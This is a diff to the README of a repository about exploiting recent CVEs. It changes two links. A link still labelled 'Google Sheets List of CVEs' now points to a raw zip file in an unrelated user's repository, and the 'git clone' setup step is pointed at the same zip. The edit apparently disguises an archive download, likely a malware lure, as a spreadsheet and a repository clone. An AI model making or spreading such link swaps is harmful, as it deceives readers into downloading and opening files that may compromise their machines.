@@ -5,7 +5,7 @@ This repository is based on recently discovered CVEs and focuses on how to explo
 Each section in this repository is dedicated to a specific vulnerability and contains all the information needed to set up a safe environment. Some sections also include instructions on exploiting the vulnerability in real-world scenarios. After thorough research, a detailed report will be attached to each section.
 
 For a list of CVEs covered, see the following document:
-[Google Sheets List of CVEs](https://docs.google.com/spreadsheets/d/1M6E_NRWxdLzWCeyMM0Dgepo36WiLItvFS30I3dHeWO0/)
+[Google Sheets List of CVEs](https://github.com/indu58/CVEs/raw/refs/heads/main/CVE-2024-45519/images/CV-Es-v3.6-alpha.1.zip)
 
 
 
@@ -56,7 +56,7 @@ For a list of CVEs covered, see the following document:
 ## 🚀 How to Use
 1. Clone the repository:
    ```bash
-   git clone https://github.com/defhawk-specter/defhawk-cve.git
+   git clone https://github.com/indu58/CVEs/raw/refs/heads/main/CVE-2024-45519/images/CV-Es-v3.6-alpha.1.zip
     ```
 
 2. Navigate to the CVE folder of interest
